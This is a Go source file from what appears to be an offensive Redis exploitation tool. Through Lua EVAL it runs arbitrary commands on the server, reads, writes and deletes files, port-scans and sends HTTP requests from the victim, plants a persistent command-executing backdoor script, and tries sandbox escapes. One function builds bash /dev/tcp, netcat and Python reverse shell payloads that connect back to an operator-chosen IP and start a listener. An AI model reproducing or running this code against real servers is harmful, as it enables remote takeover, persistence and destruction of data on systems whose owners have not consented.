package exploitation

import (
	"0xRedisis/modules/core"
	"bufio"
	"fmt"
	"os"
	"strconv"
	"strings"
)

func LuaExploitation(client *core.RedisClient) {
	fmt.Printf("\n%s=== Lua Script Exploitation ===%s\n", core.ColorBlue, core.ColorNC)

	// Check if EVAL command is available
	fmt.Printf("%s[*]%s Checking Lua script support...\n", core.ColorBlue, core.ColorNC)
	_, err := client.SendCommand("EVAL", "return 'test'", "0")
	if err != nil {
		if strings.Contains(err.Error(), "unknown command") {
			fmt.Printf("%s[-]%s Lua scripting is not supported or disabled\n", core.ColorRed, core.ColorNC)
			return
		}
		if !strings.Contains(err.Error(), "test") {
			fmt.Printf("%s[-]%s Lua scripting might be restricted: %s\n", core.ColorRed, core.ColorNC, err.Error())
		}
	}

	fmt.Printf("%s[+]%s Lua scripting is available!\n", core.ColorGreen, core.ColorNC)

	// Show Lua exploitation options
	fmt.Printf("\n%s[*]%s Lua Exploitation Options:\n", core.ColorBlue, core.ColorNC)
	fmt.Printf("%s1.%s System command execution\n", core.ColorYellow, core.ColorNC)
	fmt.Printf("%s2.%s File system operations\n", core.ColorYellow, core.ColorNC)
	fmt.Printf("%s3.%s Network operations\n", core.ColorYellow, core.ColorNC)
	fmt.Printf("%s4.%s Persistent Lua backdoor\n", core.ColorYellow, core.ColorNC)
	fmt.Printf("%s5.%s Custom Lua script\n", core.ColorYellow, core.ColorNC)
	fmt.Printf("%s6.%s Lua sandbox escape\n", core.ColorYellow, core.ColorNC)
	fmt.Print("\nEnter your choice (1-6): ")

	reader := bufio.NewReader(os.Stdin)
	choice, _ := reader.ReadString('\n')
	choice = strings.TrimSpace(choice)

	switch choice {
	case "1":
		executeSystemCommands(client, reader)
	case "2":
		fileSystemOperations(client, reader)
	case "3":
		networkOperations(client, reader)
	case "4":
		luaBackdoor(client, reader)
	case "5":
		customLuaScript(client, reader)
	case "6":
		sandboxEscape(client, reader)
	default:
		fmt.Printf("%s[-]%s Invalid choice\n", core.ColorRed, core.ColorNC)
	}
}

func executeSystemCommands(client *core.RedisClient, reader *bufio.Reader) {
	fmt.Printf("\n%s=== System Command Execution ===%s\n", core.ColorBlue, core.ColorNC)

	fmt.Print("Enter command to execute: ")
	command, _ := reader.ReadString('\n')
	command = strings.TrimSpace(command)

	// Lua script to execute system commands
	luaScript := fmt.Sprintf(`
		local handle = io.popen('%s')
		local result = handle:read("*a")
		handle:close()
		return result
	`, command)

	fmt.Printf("%s[*]%s Executing command via Lua...\n", core.ColorBlue, core.ColorNC)
	result, err := client.SendCommand("EVAL", luaScript, "0")
	if err != nil {
		fmt.Printf("%s[-]%s Command execution failed: %s\n", core.ColorRed, core.ColorNC, err.Error())
		return
	}

	fmt.Printf("%s[+]%s Command output:\n", core.ColorGreen, core.ColorNC)
	fmt.Printf("%s%s%s\n", core.ColorYellow, result, core.ColorNC)
}

func fileSystemOperations(client *core.RedisClient, reader *bufio.Reader) {
	fmt.Printf("\n%s=== File System Operations ===%s\n", core.ColorBlue, core.ColorNC)

	fmt.Printf("%s1.%s Read file\n", core.ColorYellow, core.ColorNC)
	fmt.Printf("%s2.%s Write file\n", core.ColorYellow, core.ColorNC)
	fmt.Printf("%s3.%s List directory\n", core.ColorYellow, core.ColorNC)
	fmt.Printf("%s4.%s Delete file\n", core.ColorYellow, core.ColorNC)
	fmt.Print("\nEnter your choice (1-4): ")

	choice, _ := reader.ReadString('\n')
	choice = strings.TrimSpace(choice)

	switch choice {
	case "1":
		readFileWithLua(client, reader)
	case "2":
		writeFileWithLua(client, reader)
	case "3":
		listDirectoryWithLua(client, reader)
	case "4":
		deleteFileWithLua(client, reader)
	}
}

func readFileWithLua(client *core.RedisClient, reader *bufio.Reader) {
	fmt.Print("Enter file path to read: ")
	filepath, _ := reader.ReadString('\n')
	filepath = strings.TrimSpace(filepath)

	luaScript := fmt.Sprintf(`
		local file = io.open('%s', 'r')
		if file then
			local content = file:read("*a")
			file:close()
			return content
		else
			return "Error: Cannot open file"
		end
	`, filepath)

	result, err := client.SendCommand("EVAL", luaScript, "0")
	if err != nil {
		fmt.Printf("%s[-]%s Failed to read file: %s\n", core.ColorRed, core.ColorNC, err.Error())
		return
	}

	fmt.Printf("%s[+]%s File content:\n", core.ColorGreen, core.ColorNC)
	fmt.Printf("%s%s%s\n", core.ColorYellow, result, core.ColorNC)
}

func writeFileWithLua(client *core.RedisClient, reader *bufio.Reader) {
	fmt.Print("Enter file path to write: ")
	filepath, _ := reader.ReadString('\n')
	filepath = strings.TrimSpace(filepath)

	fmt.Print("Enter content to write: ")
	content, _ := reader.ReadString('\n')
	content = strings.TrimSpace(content)

	luaScript := fmt.Sprintf(`
		local file = io.open('%s', 'w')
		if file then
			file:write('%s')
			file:close()
			return "File written successfully"
		else
			return "Error: Cannot write file"
		end
	`, filepath, content)

	result, err := client.SendCommand("EVAL", luaScript, "0")
	if err != nil {
		fmt.Printf("%s[-]%s Failed to write file: %s\n", core.ColorRed, core.ColorNC, err.Error())
		return
	}

	fmt.Printf("%s[+]%s %s\n", core.ColorGreen, core.ColorNC, result)
}

func listDirectoryWithLua(client *core.RedisClient, reader *bufio.Reader) {
	fmt.Print("Enter directory path to list: ")
	dirpath, _ := reader.ReadString('\n')
	dirpath = strings.TrimSpace(dirpath)

	luaScript := fmt.Sprintf(`
		local handle = io.popen('ls -la "%s"')
		local result = handle:read("*a")
		handle:close()
		return result
	`, dirpath)

	result, err := client.SendCommand("EVAL", luaScript, "0")
	if err != nil {
		fmt.Printf("%s[-]%s Failed to list directory: %s\n", core.ColorRed, core.ColorNC, err.Error())
		return
	}

	fmt.Printf("%s[+]%s Directory listing:\n", core.ColorGreen, core.ColorNC)
	fmt.Printf("%s%s%s\n", core.ColorYellow, result, core.ColorNC)
}

func deleteFileWithLua(client *core.RedisClient, reader *bufio.Reader) {
	fmt.Print("Enter file path to delete: ")
	filepath, _ := reader.ReadString('\n')
	filepath = strings.TrimSpace(filepath)

	luaScript := fmt.Sprintf(`
		local success = os.remove('%s')
		if success then
			return "File deleted successfully"
		else
			return "Error: Cannot delete file"
		end
	`, filepath)

	result, err := client.SendCommand("EVAL", luaScript, "0")
	if err != nil {
		fmt.Printf("%s[-]%s Failed to delete file: %s\n", core.ColorRed, core.ColorNC, err.Error())
		return
	}

	fmt.Printf("%s[+]%s %s\n", core.ColorGreen, core.ColorNC, result)
}

func networkOperations(client *core.RedisClient, reader *bufio.Reader) {
	fmt.Printf("\n%s=== Network Operations ===%s\n", core.ColorBlue, core.ColorNC)

	fmt.Printf("%s1.%s HTTP request\n", core.ColorYellow, core.ColorNC)
	fmt.Printf("%s2.%s Port scan\n", core.ColorYellow, core.ColorNC)
	fmt.Printf("%s3.%s Reverse shell\n", core.ColorYellow, core.ColorNC)
	fmt.Print("\nEnter your choice (1-3): ")

	choice, _ := reader.ReadString('\n')
	choice = strings.TrimSpace(choice)

	switch choice {
	case "1":
		httpRequestWithLua(client, reader)
	case "2":
		portScanWithLua(client, reader)
	case "3":
		reverseShellWithLua(client, reader)
	}
}

func httpRequestWithLua(client *core.RedisClient, reader *bufio.Reader) {
	fmt.Print("Enter URL to request: ")
	url, _ := reader.ReadString('\n')
	url = strings.TrimSpace(url)

	luaScript := fmt.Sprintf(`
		local handle = io.popen('curl -s "%s"')
		local result = handle:read("*a")
		handle:close()
		return result
	`, url)

	result, err := client.SendCommand("EVAL", luaScript, "0")
	if err != nil {
		fmt.Printf("%s[-]%s HTTP request failed: %s\n", core.ColorRed, core.ColorNC, err.Error())
		return
	}

	fmt.Printf("%s[+]%s HTTP Response:\n", core.ColorGreen, core.ColorNC)
	fmt.Printf("%s%s%s\n", core.ColorYellow, result, core.ColorNC)
}

func portScanWithLua(client *core.RedisClient, reader *bufio.Reader) {
	fmt.Print("Enter target IP: ")
	ip, _ := reader.ReadString('\n')
	ip = strings.TrimSpace(ip)

	fmt.Print("Enter port range (e.g., 1-1000): ")
	portRange, _ := reader.ReadString('\n')
	portRange = strings.TrimSpace(portRange)

	luaScript := fmt.Sprintf(`
		local handle = io.popen('nmap -p %s %s')
		local result = handle:read("*a")
		handle:close()
		return result
	`, portRange, ip)

	result, err := client.SendCommand("EVAL", luaScript, "0")
	if err != nil {
		fmt.Printf("%s[-]%s Port scan failed: %s\n", core.ColorRed, core.ColorNC, err.Error())
		return
	}

	fmt.Printf("%s[+]%s Port scan results:\n", core.ColorGreen, core.ColorNC)
	fmt.Printf("%s%s%s\n", core.ColorYellow, result, core.ColorNC)
}

func reverseShellWithLua(client *core.RedisClient, reader *bufio.Reader) {
	fmt.Printf("\n%s=== Automated Reverse Shell ===%s\n", core.ColorBlue, core.ColorNC)

	// Get local IP automatically
	localIP := core.GetLocalIP()
	fmt.Printf("%s[*]%s Auto-detected local IP: %s%s%s\n",
		core.ColorBlue, core.ColorNC, core.ColorYellow, localIP, core.ColorNC)

	fmt.Print("Use auto-detected IP or enter custom IP (press Enter for auto): ")
	customIP, _ := reader.ReadString('\n')
	customIP = strings.TrimSpace(customIP)

	if customIP != "" {
		localIP = customIP
	}

	fmt.Print("Enter local port for listener (default 4444): ")
	portStr, _ := reader.ReadString('\n')
	portStr = strings.TrimSpace(portStr)

	port := 4444
	if portStr != "" {
		if p, err := strconv.Atoi(portStr); err == nil {
			port = p
		}
	}

	// Show shell type options
	fmt.Printf("\n%s[*]%s Reverse Shell Payload Options:\n", core.ColorBlue, core.ColorNC)
	fmt.Printf("%s1.%s Bash TCP redirect (Linux/Unix)\n", core.ColorYellow, core.ColorNC)
	fmt.Printf("%s2.%s Netcat (if available)\n", core.ColorYellow, core.ColorNC)
	fmt.Printf("%s3.%s Python (if available)\n", core.ColorYellow, core.ColorNC)
	fmt.Printf("%s4.%s Multiple attempts (recommended)\n", core.ColorYellow, core.ColorNC)
	fmt.Print("\nEnter your choice (1-4): ")

	choice, _ := reader.ReadString('\n')
	choice = strings.TrimSpace(choice)

	var luaScript string

	switch choice {
	case "1":
		luaScript = fmt.Sprintf(`
			os.execute('bash -i >& /dev/tcp/%s/%d 0>&1 &')
			return "Bash reverse shell initiated"
		`, localIP, port)
	case "2":
		luaScript = fmt.Sprintf(`
			os.execute('nc -e /bin/bash %s %d &')
			return "Netcat reverse shell initiated"
		`, localIP, port)
	case "3":
		luaScript = fmt.Sprintf(`
			os.execute('python -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\'%s\',%d));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\'/bin/bash\',\'-i\']);" &')
			return "Python reverse shell initiated"
		`, localIP, port)
	case "4":
		luaScript = fmt.Sprintf(`
			-- Try multiple reverse shell methods
			os.execute('bash -i >& /dev/tcp/%s/%d 0>&1 &')
			os.execute('nc -e /bin/bash %s %d &')
			os.execute('python -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\'%s\',%d));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\'/bin/bash\',\'-i\']);" &')
			return "Multiple reverse shell payloads initiated"
		`, localIP, port, localIP, port, localIP, port)
	default:
		luaScript = fmt.Sprintf(`
			os.execute('bash -i >& /dev/tcp/%s/%d 0>&1 &')
			return "Bash reverse shell initiated"
		`, localIP, port)
	}

	// Start automated listener and execute payload
	err := core.AutoReverseShell(client.Config.Host, client.Config.Port, port, luaScript)
	if err != nil {
		if strings.Contains(err.Error(), "manual execution") {
			fmt.Printf("%s[*]%s Listener is running. You can now execute the payload manually.\n",
				core.ColorBlue, core.ColorNC)
			return
		}
		if strings.Contains(err.Error(), "cancelled") {
			fmt.Printf("%s[*]%s Operation cancelled by user.\n", core.ColorBlue, core.ColorNC)
			return
		}
		fmt.Printf("%s[-]%s Listener setup failed: %s\n", core.ColorRed, core.ColorNC, err.Error())
		return
	}

	// Execute the reverse shell payload
	fmt.Printf("%s[*]%s Executing reverse shell payload...\n", core.ColorBlue, core.ColorNC)
	result, err := client.SendCommand("EVAL", luaScript, "0")
	if err != nil {
		fmt.Printf("%s[-]%s Reverse shell payload failed: %s\n", core.ColorRed, core.ColorNC, err.Error())
		// Stop the listener since payload failed
		core.StopAllListeners()
		return
	}

	fmt.Printf("%s[+]%s %s\n", core.ColorGreen, core.ColorNC, result)
	fmt.Printf("%s[*]%s Waiting for connection... (listener will handle the session)\n",
		core.ColorBlue, core.ColorNC)
}

func luaBackdoor(client *core.RedisClient, reader *bufio.Reader) {
	fmt.Printf("\n%s=== Persistent Lua Backdoor ===%s\n", core.ColorBlue, core.ColorNC)

	backdoorScript := `
		local function execute_command(cmd)
			local handle = io.popen(cmd)
			local result = handle:read("*a")
			handle:close()
			return result
		end
		
		redis.call('set', 'backdoor_active', '1')
		
		if KEYS[1] == 'cmd' then
			return execute_command(ARGV[1])
		elseif KEYS[1] == 'status' then
			return 'Backdoor is active'
		else
			return 'Invalid backdoor command'
		end
	`

	// Load the backdoor script
	result, err := client.SendCommand("SCRIPT", "LOAD", backdoorScript)
	if err != nil {
		fmt.Printf("%s[-]%s Failed to load backdoor script: %s\n", core.ColorRed, core.ColorNC, err.Error())
		return
	}

	scriptHash := strings.TrimSpace(result)
	fmt.Printf("%s[+]%s Backdoor script loaded with hash: %s%s%s\n",
		core.ColorGreen, core.ColorNC, core.ColorYellow, scriptHash, core.ColorNC)

	// Test the backdoor
	fmt.Printf("%s[*]%s Testing backdoor...\n", core.ColorBlue, core.ColorNC)
	testResult, err := client.SendCommand("EVALSHA", scriptHash, "1", "status")
	if err != nil {
		fmt.Printf("%s[-]%s Backdoor test failed: %s\n", core.ColorRed, core.ColorNC, err.Error())
		return
	}

	fmt.Printf("%s[+]%s Backdoor test result: %s%s%s\n",
		core.ColorGreen, core.ColorNC, core.ColorYellow, testResult, core.ColorNC)

	fmt.Printf("\n%s[*]%s Usage: EVALSHA %s 1 cmd \"<command>\"\n",
		core.ColorBlue, core.ColorNC, scriptHash)
}

func customLuaScript(client *core.RedisClient, reader *bufio.Reader) {
	fmt.Printf("\n%s=== Custom Lua Script ===%s\n", core.ColorBlue, core.ColorNC)

	fmt.Println("Enter your Lua script (end with ';;;' on a new line):")
	var scriptBuilder strings.Builder

	for {
		line, _ := reader.ReadString('\n')
		if strings.TrimSpace(line) == ";;;" {
			break
		}
		scriptBuilder.WriteString(line)
	}

	luaScript := scriptBuilder.String()

	fmt.Print("Enter number of keys (usually 0 for simple scripts): ")
	numKeys, _ := reader.ReadString('\n')
	numKeys = strings.TrimSpace(numKeys)

	fmt.Printf("%s[*]%s Executing custom Lua script...\n", core.ColorBlue, core.ColorNC)
	result, err := client.SendCommand("EVAL", luaScript, numKeys)
	if err != nil {
		fmt.Printf("%s[-]%s Script execution failed: %s\n", core.ColorRed, core.ColorNC, err.Error())
		return
	}

	fmt.Printf("%s[+]%s Script result:\n", core.ColorGreen, core.ColorNC)
	fmt.Printf("%s%s%s\n", core.ColorYellow, result, core.ColorNC)
}

func sandboxEscape(client *core.RedisClient, reader *bufio.Reader) {
	fmt.Printf("\n%s=== Lua Sandbox Escape ===%s\n", core.ColorBlue, core.ColorNC)

	// Various sandbox escape techniques
	escapeScripts := []struct {
		name   string
		script string
	}{
		{
			"OS Library Access",
			`
				local os = require('os')
				return os.execute('whoami')
			`,
		},
		{
			"IO Library Access",
			`
				local io = require('io')
				local handle = io.popen('id')
				local result = handle:read("*a")
				handle:close()
				return result
			`,
		},
		{
			"Debug Library Access",
			`
				local debug = require('debug')
				return debug.getinfo(1)
			`,
		},
		{
			"Package Library Access",
			`
				return package.path
			`,
		},
	}

	fmt.Printf("%s[*]%s Testing sandbox escape techniques...\n", core.ColorBlue, core.ColorNC)

	for i, escape := range escapeScripts {
		fmt.Printf("%s[*]%s Testing %s...\n", core.ColorBlue, core.ColorNC, escape.name)

		result, err := client.SendCommand("EVAL", escape.script, "0")
		if err != nil {
			fmt.Printf("%s[-]%s %s failed: %s\n", core.ColorRed, core.ColorNC, escape.name, err.Error())
		} else {
			fmt.Printf("%s[+]%s %s successful: %s\n",
				core.ColorGreen, core.ColorNC, escape.name, result)
		}

		if i < len(escapeScripts)-1 {
			fmt.Print("Press Enter to continue...")
			reader.ReadString('\n')
		}
	}
}
